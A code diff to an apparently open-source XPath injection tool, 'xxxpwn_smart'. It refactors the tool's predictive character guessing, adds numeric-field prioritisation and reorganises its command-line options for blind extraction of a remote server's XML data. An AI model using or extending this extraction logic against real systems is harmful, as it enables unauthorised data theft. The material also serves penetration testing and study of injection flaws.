@@ -46,13 +46,10 @@ import trie
 VERSION = "1.0.0_alpha"
 ROOT_NODE = '/*[1]'  # Root node of a XML document
 BAD_CHAR = '?'       # Placeholder for a character not in character set
-COMMON_PUNCT = ' .,?!-()'
 QI = Queue.Queue()   # Input Queue
 QO = Queue.Queue()   # Output Queue
 node_names = []      # Used for optimization of previous nodes
 attribute_names = [] # Used for optimization of previous attributes
-COUNT_OPTIMIZE = 30  # Optimize the character set if flag is enabled for any
-                     # string larger than this. Best when over 30ish
 root_nodes = root_comments = root_instructions = nodes_total = \
 		attributes_total = comments_total = instructions_total = \
 		text_total = elements_total = -1 # Used for optimization code
@@ -87,13 +84,14 @@ def get_quoted_chars(chars):
 #		result.append(set(map(lambda s: s[i:i+1], str_list)))
 #	return result
 
-def get_chars_by_likelihood(so_far, chars):
+def get_chars_by_likelihood(so_far, chars, common_chars):
 	'''Group the given charset by likelihood of each character given value
 	   so_far'''
 	global trie_root
 	global args
 	num_bands_pred = 3 # for predicted characters only
-	num_bands = num_bands_pred + 2 # two bands for rest of characters
+	num_bands_rest = 2 # rest of characters => common and uncommon
+	num_bands = num_bands_pred + num_bands_rest
 
 	pred_chars = dict.fromkeys(chars, 0)
 	if trie_root is not None:
@@ -101,7 +99,7 @@ def get_chars_by_likelihood(so_far, chars):
 		# User input could be a phrase
 		pred_chars = trie.predict(trie_root, so_far, result=pred_chars,
 				strip_so_far=True, add_freqs=True, no_new=True, max_new_chars=1)
-		words = re.split('(?:[^\w]|_)+', so_far)
+		words = re.split(r'[\W_]+', so_far)
 		if len(words) > 1:
 			# Add predictions for the last word as well
 			pred_chars = trie.predict(trie_root, words[-1], result=pred_chars,
@@ -116,7 +114,7 @@ def get_chars_by_likelihood(so_far, chars):
 	get_band = lambda freq, char: \
 			( (freq - min_freq)/step + num_bands_rest) \
 		if freq > 0 else \
-			( (char in args.common_chars)*1 )
+			( (char in common_chars)*1 )
 	freq_groups = dict.fromkeys(range(num_bands), '')
 	for char, freq in pred_chars.items():
 		freq_groups[get_band(freq,char)] += char
@@ -211,6 +209,11 @@ def to_lower(node):
 			node = node.replace(r, '')
 		node = 'translate(%s,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")' % node
 	return node
+
+def get_common_chars(name):
+	global args
+	is_numeric = bool(re.search(args.numeric_nodes, name))
+	return args.common_digits if is_numeric else args.common_chars
 
 def split_http(data):
 	newline = re.search(r'\r?\n', data)
@@ -366,12 +369,12 @@ def get_character_smart(node, position, char_freq_groups):
 		new_c = BAD_CHAR
 	return new_c
 
-def get_value_bst(node, count):
+def get_value_bst(node, count, chars, common_chars):
 	'''Tie BST String-Length with BST Character Discovery and perform exception
 	   handling.'''
 	global args
+	global COUNT_OPTIMIZE
 	sys.stdout.flush()
-	chars = args.character_set
 
 	#TODO: Attempt pre-discovery stuff here, which somewhat implies we know
 	#      what type 'node' is
@@ -402,7 +405,7 @@ def get_value_bst(node, count):
 		pos = 1
 		while True and (count is None or pos <= count):
 			new_c = get_character_smart(node, pos,
-					get_chars_by_likelihood(value, chars))
+					get_chars_by_likelihood(value, chars, common_chars))
 			if new_c == '':
 				assert not args.prediscover_strlen
 				break
@@ -470,7 +473,8 @@ def get_xml_details():
 	if not args.no_comments:
 		for c in range(1, root_comments+1):
 			comments_total -= 1
-			comment = get_value_bst("/comment()[%s]" % (c), args.max_cont_len)
+			comment = get_value_bst("/comment()[%s]" % (c), args.max_cont_len,
+					args.character_set, args.common_chars)
 			xml_content += ("<!--%s-->" % comment)
 			sys.stdout.write("<!--%s-->" % comment)
 
@@ -478,7 +482,7 @@ def get_xml_details():
 		for i in range(1, root_instructions+1):
 			instructions_total -= 1
 			instruction = get_value_bst("/processing-instruction()[%s]" % (i),
-					args.max_cont_len)
+					args.max_cont_len, args.character_set, args.common_chars)
 			xml_content += ("<?%s?>" % instruction)
 			sys.stdout.write("<?%s?>" % instruction)
 
@@ -509,7 +513,9 @@ def get_xml_bst(node, level=0):
 	if args.xml_match:
 		node_name = match_similar("name(%s)" % node, node_names[level])
 	if not node_name:
-		node_name = get_value_bst("name(%s)" % node, args.max_name_len)
+		#XXX guess if name is numeric
+		node_name = get_value_bst("name(%s)" % node, args.max_name_len,
+				args.character_set, args.common_chars)
 		node_names[level].add(node_name) # Add to set
 
 	xml_content += ("<%s" % (node_name))
@@ -527,13 +533,15 @@ def get_xml_bst(node, level=0):
 				attribute_name = match_similar("name(%s/@*[%i])" % (node, a),
 						attribute_names[level])
 			if not attribute_name:
+				#XXX guess if name is numeric
 				attribute_name = get_value_bst("name(%s/@*[%i])" % (node, a),
-						args.max_name_len)
+						args.max_name_len, args.character_set, args.common_chars)
 				attribute_names[level].add(attribute_name)
 
 			if not args.no_values:
 				attribute_value = get_value_bst("%s/@*[%i]" % (node, a),
-						args.max_cont_len)
+						args.max_cont_len, args.character_set,
+						get_common_chars(attribute_name))
 				xml_content += (' %s="%s"' % (attribute_name, attribute_value))
 				sys.stdout.write(' %s="%s"' % (attribute_name.encode('latin1'),
 					attribute_value.encode('latin1')))
@@ -549,7 +557,8 @@ def get_xml_bst(node, level=0):
 			comment_count = get_count_bst("count(%s/comment())" % node)
 		for c in range(1, comment_count+1):
 			comments_total -= 1
-			comment = get_value_bst("%s/comment()[%s]" % (node, c), args.max_cont_len)
+			comment = get_value_bst("%s/comment()[%s]" % (node, c),
+					args.max_cont_len, args.character_set, args.common_chars)
 			xml_content += ("<!--%s-->" % comment)
 			sys.stdout.write("<!--%s-->" % comment.encode('latin1'))
 
@@ -561,7 +570,8 @@ def get_xml_bst(node, level=0):
 			nodes_total -= 1
 			instructions_total -= 1
 			instruction = get_value_bst("%s/processing-instruction()[%s]" \
-					% (node, i), args.max_cont_len)
+					% (node, i), args.max_cont_len, args.character_set,
+					args.common_chars)
 			xml_content += ("<?%s?>" % instruction)
 			sys.stdout.write("<?%s?>" % instruction.encode('latin1'))
 
@@ -578,8 +588,9 @@ def get_xml_bst(node, level=0):
 		for t in range(1, text_count+1):
 			text_total -= 1
 			text_value = get_value_bst("%s/text()[%i]" % (node, t),
-					args.max_cont_len)
-			if re.search('\S', text_value, re.MULTILINE):
+					args.max_cont_len, args.character_set,
+					get_common_chars(node_name))
+			if re.search(r'\S', text_value, re.MULTILINE):
 				xml_content += ("%s" % text_value)
 				sys.stdout.write("%s" % \
 						text_value.replace('\n', '').encode('latin1'))
@@ -613,8 +624,10 @@ def xml_search(string_literal):
 		print "### Found %s in %i node name(s) ###" % \
 				(string_literal, node_count)
 		for n in range(1, node_count+1):
+			#XXX guess if name is numeric
 			node_name = get_value_bst('(name((//*[%s(%s,%s)])[%i]))' % \
-					(match, name_node, string_literal, n), args.max_name_len)
+					(match, name_node, string_literal, n), args.max_name_len,
+					args.character_set, args.common_chars)
 			print node_name
 
 	if not args.no_attributes:
@@ -623,16 +636,22 @@ def xml_search(string_literal):
 		print "### Found %s in %i attribute name(s) ###" % \
 				(string_literal, attribute_count)
 		for a in range(1, attribute_count+1):
+			#XXX guess if name is numeric
 			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % \
-					(match, name_node, string_literal, a), args.max_name_len)
+					(match, name_node, string_literal, a), args.max_name_len,
+					args.character_set, args.common_chars)
 			attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % \
-					(match, name_node, string_literal, a), args.max_cont_len)
+					(match, name_node, string_literal, a), args.max_cont_len,
+					args.character_set,
+					get_common_chars(attribute_name))
 			print '%s="%s"' % (attribute_name, attribute_value)
 
 			'''# Assume they always want the value if they are searching for the name
 			if not args.no_values:
 				attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % \
-						(match,name_node,string_literal,a), args.max_cont_len)
+						(match,name_node,string_literal,a), args.max_cont_len,
+						args.character_set,
+						get_common_chars(attribute_name))
 				print '%s="%s"' % (attribute_name, attribute_value)
 			else:
 				print '%s' % (attribute_name)
@@ -646,12 +665,16 @@ def xml_search(string_literal):
 		print "### Found %s in %i attribute value(s) ###" % \
 				(string_literal, attribute_count)
 		for a in range(1, attribute_count+1):
+			#XXX guess if name is numeric
 			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % \
-					(match, node, string_literal, a), args.max_name_len)
+					(match, node, string_literal, a), args.max_name_len,
+					args.character_set, args.common_chars)
 
 			if not args.no_values:
 				attribute_value = get_value_bst('((//@*[%s(%s,%s)])[%i])' % \
-						(match, node, string_literal, a), args.max_cont_len)
+						(match, node, string_literal, a), args.max_cont_len,
+						args.character_set,
+						get_common_chars(attribute_name))
 				print '%s="%s"' % (attribute_name, attribute_value)
 			else:
 				print '%s' % (attribute_name)
@@ -662,7 +685,8 @@ def xml_search(string_literal):
 		print "### Found %s in %i comments(s) ###" % (string_literal, comment_count)
 		for c in range(1, comment_count+1):
 			comment = get_value_bst("(//comment()[%s(%s,%s)])[%i]" % \
-					(match, node, string_literal, c), args.max_cont_len)
+					(match, node, string_literal, c), args.max_cont_len,
+					args.character_set, args.common_chars)
 			print "<!--%s-->" % comment
 
 	if not args.no_processor:
@@ -671,7 +695,8 @@ def xml_search(string_literal):
 		print "### Found %s in %i instruction(s) ###" % (string_literal, instruction_count)
 		for i in range(1, instruction_count+1):
 			instruction = get_value_bst("(//processing-instruction()[%s(%s,%s)])[%i]" % \
-					(match, node, string_literal, i), args.max_cont_len)
+					(match, node, string_literal, i), args.max_cont_len,
+					args.character_set, args.common_chars)
 			print "<?%s?>" % instruction
 
 	if not args.no_text:
@@ -680,7 +705,9 @@ def xml_search(string_literal):
 		print "### Found %s in %i text(s) ###" % (string_literal, text_count)
 		for t in range(1, text_count+1):
 			text = get_value_bst("(//text()[%s(%s,%s)])[%i]" % \
-					(match, node, string_literal, t), args.max_cont_len)
+					(match, node, string_literal, t), args.max_cont_len,
+					args.character_set,
+					get_common_chars(node_name))
 			print "%s" % text
 
 
@@ -824,6 +851,10 @@ def attack(inject):
 if __name__ == "__main__":
 	t1 = time.time()
 	global REQUEST_COUNT
+	global COUNT_OPTIMIZE
+	COUNT_OPTIMIZE = 30  # Optimize the character set if flag is enabled for any
+	                     # string larger than this. Best when over 30ish
+	NUMERIC_CHARSET = string.digits + ' -.,$' #TODO: cmdline option
 	REQUEST_COUNT = 0
 
 	global trie_root # built after argument processing
@@ -841,70 +872,75 @@ if __name__ == "__main__":
 		return i
 		
 	# http://docs.python.org/dev/library/argparse.html
-	parser = argparse.ArgumentParser(prog='xxxpwn_smart', description="Read a remote XML file through an XPath injection vulnerability using optimized predictive text search")
+	parser = argparse.ArgumentParser(prog='xxxpwn_smart', description="Read a remote XML file through an XPath injection vulnerability using optimized predictive text search", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 	#  subparsers = parser.add_subparsers(dest='match_type', help='Choose how successful injection is detected. Commands accept more options, use <command> -h', title='Match type')
 	subparsers = parser.add_subparsers(dest='match_type', title='Match type')
 
 	# Regex match options
 	parser_string = subparsers.add_parser('regex', help='Determine successful injection based on presence of regular expression in reply')
 	parser_string.add_argument("match", help="Regular expression that is present on successful injection")
-	parser_string.add_argument("--case", help="Perform case-sensitive string matches (default is insensitive)", dest="match_case", action='store_const', const=0, default=re.IGNORECASE)
+	parser_string.add_argument("--case", help="Perform case-sensitive string matches (default: insensitive)", dest="match_case", action='store_const', const=0, default=re.IGNORECASE)
 	parser_string_group = parser_string.add_mutually_exclusive_group()
-	parser_string_group.add_argument("--headers", help="For HTTP, search only in response headers (default is entire response)", dest="match_loc", action='store_const', const='head')
-	parser_string_group.add_argument("--body", help="For HTTP, search only in response body (default is entire response)", dest="match_loc", action='store_const', const='body')
+	parser_string_group.add_argument("--headers", help="For HTTP, search only in response headers (default: False)", dest="match_loc", action='store_const', const='head')
+	parser_string_group.add_argument("--body", help="For HTTP, search only in response body (default: False)", dest="match_loc", action='store_const', const='body')
 
 	# Content length match options
 	parser_length = subparsers.add_parser('length', help='Determine successful injection based on content length')
 	parser_length.add_argument("match", help="Content length of reply on successful injection", type=pos_int)
 	parser_length_group = parser_length.add_mutually_exclusive_group()
-	parser_length_group.add_argument("--min", help="Match on any content length greater than or equal to the given one (default is exact)", dest="match_op", action='store_const', const=operator.ge, default=operator.eq)
-	parser_length_group.add_argument("--max", help="Match on any content length less than or equal to the given one (default is exact)", dest="match_op", action='store_const', const=operator.le, default=operator.eq)
+	parser_length_group.add_argument("--min", help="Match on any content length greater than or equal to the given one (default: exact length)", dest="match_op", action='store_const', const=operator.ge, default=operator.eq)
+	parser_length_group.add_argument("--max", help="Match on any content length less than or equal to the given one (default: exact length)", dest="match_op", action='store_const', const=operator.le, default=operator.eq)
 
 	# Rest of positional arguments
 	parser.add_argument("host", help="Hostname or IP to connect to", metavar='HOST')
-	parser.add_argument("inject_file", help="File containing sample request with $INJECT as dynamic injection location (default is stdin)", type=argparse.FileType('rb'), default=sys.stdin, metavar='FILE')
+	parser.add_argument("inject_file", help="File containing sample request with $INJECT as dynamic injection location", type=argparse.FileType('rb'), metavar='FILE')
 
 	# Global options
 	parser.add_argument("-V", "--version", help="Print version and exit", action='version', version=VERSION)
 	parser.add_argument("--debug", help="Print debugging messages", action='store_true', dest='debug', default=False)
-	parser.add_argument("-r", "--reverse-match", help="Make a positive match indicate a failed injection (default is successful)", dest="match_fail", action='store_true', default=False)
-	parser.add_argument("-U", "--urlencode", help="URL encode key characters in payload (default is disabled)", dest="urlencode", action="store_true", default=False)
-	parser.add_argument("-H", "--htmlencode", help="HTML Encode key characters in payload (default is disabled)", dest="htmlencode", action="store_true", default=False)
-	parser.add_argument("-s", "--ssl", help="Use SSL for connection (default is off)", dest="use_ssl", action="store_true", default=False)
-	parser.add_argument("-p", "--port", help="Port number (default is 80 or 443 if using SSL)", type=pos_int, dest="port", metavar='PORT')
+	parser.add_argument("-r", "--reverse-match", help="Make a positive match indicate a failed injection", dest="match_fail", action='store_true', default=False)
+	parser.add_argument("-U", "--urlencode", help="URL encode key characters in payload", dest="urlencode", action="store_true", default=False)
+	parser.add_argument("-H", "--htmlencode", help="HTML Encode key characters in payload", dest="htmlencode", action="store_true", default=False)
+	parser.add_argument("-s", "--ssl", help="Use SSL for connection", dest="use_ssl", action="store_true", default=False)
+	parser.add_argument("-p", "--port", help="Port number (default: 80 or 443 if using SSL)", type=pos_int, dest="port", metavar='PORT')
 
 	group_test = parser.add_argument_group('Retrieval options')
 	group_test.add_argument("-e", "--example", help="Test injection with an example injection request", dest="example", metavar='PAYLOAD')
 	group_test.add_argument("--summary", help="Print XML summary information only", dest="summary", action="store_true", default=False)
-	group_test.add_argument("--max_name_length", help="Retrieve only up to N characters for every node/attribute name (default is full name)", type=nonneg_int, dest="max_name_len", metavar='N')
-	group_test.add_argument("--max_content_length", help="Retrieve only up to N characters for every node/attribute content (default is full content)", type=nonneg_int, dest="max_cont_len", metavar='N')
-	group_test.add_argument("--no_root", help="Disable accessing comments/instructions in root (default is enabled)", dest="no_root", action="store_true", default=False)
-	group_test.add_argument("--no_comments", help="Disable accessing comments/instructions in retrieval (default is enabled)", dest="no_comments", action="store_true", default=False)
-	group_test.add_argument("--no_processor", help="Disable accessing comments nodes (default is enabled)", dest="no_processor", action="store_true", default=False)
-	group_test.add_argument("--no_attributes", help="Disable accessing attributes (default is enabled)", dest="no_attributes", action="store_true", default=False)
-	group_test.add_argument("--no_values", help="Disable accessing attribute values (default is enabled)", dest="no_values", action="store_true", default=False)
-	group_test.add_argument("--no_text", help="Disable accessing text nodes (default is enabled)", dest="no_text", action="store_true", default=False)
-	group_test.add_argument("--no_child", help="Disable accessing child nodes (default is enabled)", dest="no_child", action="store_true", default=False)
+	group_test.add_argument("--max_name_length", help="Retrieve only up to N characters for every node/attribute name", type=nonneg_int, dest="max_name_len", metavar='N')
+	group_test.add_argument("--max_content_length", help="Retrieve only up to N characters for every node/attribute content", type=nonneg_int, dest="max_cont_len", metavar='N')
+	group_test.add_argument("--no_root", help="Disable accessing comments/instructions in root", dest="no_root", action="store_true", default=False)
+	group_test.add_argument("--no_comments", help="Disable accessing comments/instructions in retrieval", dest="no_comments", action="store_true", default=False)
+	group_test.add_argument("--no_processor", help="Disable accessing comments nodes", dest="no_processor", action="store_true", default=False)
+	group_test.add_argument("--no_attributes", help="Disable accessing attributes", dest="no_attributes", action="store_true", default=False)
+	group_test.add_argument("--no_values", help="Disable accessing attribute values", dest="no_values", action="store_true", default=False)
+	group_test.add_argument("--no_text", help="Disable accessing text nodes", dest="no_text", action="store_true", default=False)
+	group_test.add_argument("--no_child", help="Disable accessing child nodes", dest="no_child", action="store_true", default=False)
 
-	group_adv = parser.add_argument_group('Advanced options')
-	parser_trie_dic_group = group_adv.add_mutually_exclusive_group()
-	parser_trie_dic_group.add_argument("-d", "--dictionary", help="A delimited file containing words (column 1) and frequencies (column 2). (default is none, disable predictive search)", dest="trie_dic")
-	parser_trie_dic_group.add_argument("-D", "--bin-dictionary", help="The .pickle file generated by us using a previous delimited ASCII dictionary (default is none, disable predictive search)", dest="trie_pickle")
-	group_adv.add_argument("--trie-delim", help="Delimiter for trie dictionary file (default is a tab)", dest="trie_delim", default="\t")
-	group_adv.add_argument("-l", "--lowercase", help="Optimize further by reducing injection to lowercase matches (default is off)", dest="use_lowercase", action="store_true", default=False)
+	group_adv_cs = parser.add_argument_group('Advanced options for character prediction')
+	parser_trie_dic_group = group_adv_cs.add_mutually_exclusive_group()
+	parser_trie_dic_group.add_argument("-d", "--dictionary", help="A delimited file containing words (column 1) and frequencies (column 2).", dest="trie_dic", metavar='FILE')
+	parser_trie_dic_group.add_argument("-D", "--bin_dictionary", help="The .pickle file generated by us using a previous delimited ASCII dictionary", dest="trie_pickle", metavar='FILE')
+	#TODO: add to default list of numeric nodes
+	parser_trie_dic_group.add_argument("--numeric_nodes", help="Node/attribute names matching the given regular expression prioritize --numeric_characters", dest="numeric_nodes", default=r'(_|\b)id(_|\b)|(_|\b)number(_|\b)|(_|\b)mobile(_|\b)|phone(_|\b)|(_|\b)fax(_|\b)|(_|\b)price(_|\b)', metavar='REGEX')
+	group_adv_cs.add_argument("--trie_delim", help="Delimiter for trie dictionary file", dest="trie_delim", default="\t", metavar='CHARACTER')
+	group_adv_cs.add_argument("-o", "--optimize_charset", help="Optimize character set globally and for any string length over %i" % COUNT_OPTIMIZE, dest="optimize_charset", action="store_true", default=False)
+	group_adv_cs.add_argument("-u", "--use_characters", help="Use given string for BST character discovery", dest="character_set", default=string.printable, metavar='CHARSET')
+	group_adv_cs.add_argument("--common_characters", help="[For general nodes] After exhausting characters from dictionary prediction (if enabled), try the given set of characters before all the rest'). Use '' to disable", dest="common_chars", default=string.lowercase + ' .,?!-()', metavar='CHARSET')
+	group_adv_cs.add_argument("--numeric_characters", help="[For numeric nodes] After exhausting characters from dictionary prediction (if enabled), try the given set of characters before all the rest. Use '' to disable", dest="common_digits", default=string.digits + ' -.,$', metavar='CHARSET')
+	group_adv_cs.add_argument("--unicode", help="Include Unicode characters to search space", dest="unicode", action="store_true", default=False)
+
+	group_adv = parser.add_argument_group('Other advanced options')
+	group_adv.add_argument("-l", "--lowercase", help="Optimize further by reducing injection to lowercase matches", dest="use_lowercase", action="store_true", default=False)
 	group_adv.add_argument("-g", "--global_count", help="Maintain global count of nodes", dest="global_count", action="store_true", default=False)
-	group_adv.add_argument("-n", "--normalize_space", help="Normalize whitespace (default is off)", dest="normalize_space", action="store_true", default=False)
-	group_adv.add_argument("-o", "--optimize_charset", help="Optimize character set globally and for any string length over %i" % COUNT_OPTIMIZE, dest="optimize_charset", action="store_true", default=False)
-	group_adv.add_argument("-L", "--use_strlen", help="Find out the length of a value before querying it character by character. This may work better if not using prediction.", dest="prediscover_strlen", action="store_true", default=False)
+	group_adv.add_argument("-n", "--normalize_space", help="Normalize whitespace", dest="normalize_space", action="store_true", default=False)
+	group_adv.add_argument("-L", "--use_strlen", help="Don't find out the length of a value before querying it character by character. This may work better if using prediction.", dest="prediscover_strlen", action="store_false", default=True)
 	group_adv.add_argument("-x", "--xml_match", help="Match current nodes to previously recovered data", dest="xml_match", action="store_true", default=False)
-	group_adv.add_argument("--len_low", help="Start guessing string lengths are at least N characters (default is 0)", type=nonneg_int, dest="len_low", default=0, metavar='N')
-	group_adv.add_argument("--len_high", help="Start guessing string lengths are at most N characters (default is 16)", type=pos_int, dest="len_high", default=16, metavar='N')
-	group_adv.add_argument("--start_node", help="Start recovery at given node (default is root node /*[1])", dest="start_node", default=ROOT_NODE, metavar='NODE')
+	group_adv.add_argument("--len_low", help="Start guessing string lengths are at least N characters", type=nonneg_int, dest="len_low", default=0, metavar='N')
+	group_adv.add_argument("--len_high", help="Start guessing string lengths are at most N characters", type=pos_int, dest="len_high", default=16, metavar='N')
+	group_adv.add_argument("--start_node", help="Start recovery at given node", dest="start_node", default=ROOT_NODE, metavar='NODE')
 	#group_adv.add_argument("-k", "--keep_alive", help="Use HTTP Keep Alives connections to speedup round-trip time", dest="keep_alive", action="store_true", default=False)
-	group_adv.add_argument("-u", "--use_characters", help="Use given string for BST character discovery (default is printable characters)", dest="character_set", default=string.printable, metavar='CHARSET')
-	group_adv.add_argument("--common_characters", help="After exhausting characters from dictionary prediction (if enabled), try the given set of characters before all the rest (default is lowercase + '%s' characters). Use '' to disable" % COMMON_PUNCT, dest="common_chars", default=string.lowercase + COMMON_PUNCT, metavar='CHARSET')
-	group_adv.add_argument("--unicode", help="Include Unicode characters to search space", dest="unicode", action="store_true", default=False)
-	#group_adv.add_argument("-t", "--threads", help="Parallelize attack using N threads (default is 1)", dest="threads", type=nonneg_int, default=0, metavar='N')
+	#group_adv.add_argument("-t", "--threads", help="Parallelize attack using N threads", dest="threads", type=nonneg_int, default=0, metavar='N')
 	group_adv.add_argument("--xpath2", help="Check for presence of XPath 2.0 functions", dest="xpath2", action="store_true", default=False)
 	group_adv.add_argument("--search", help="Print all string matches (use -l for case-insensitive)", dest="search", metavar='STRING')
 	group_adv.add_argument("--search_start", help="Search only at start of node", dest="search_start", action="store_true", default=False)
@@ -922,7 +958,7 @@ if __name__ == "__main__":
 		parser.error("Invalid character length matching parameters. Must be set as %i >= %i:" % (args.len_low, args.len_high))
 		exit(1)
 	#if args.trie_delim is not None and args.trie_pickle is None:
-	#	parser.error("--trie-delim requires a filename to be given, use -d")
+	#	parser.error("--trie_delim requires a filename to be given, use -d")
 	#	exit(1)
 		
 
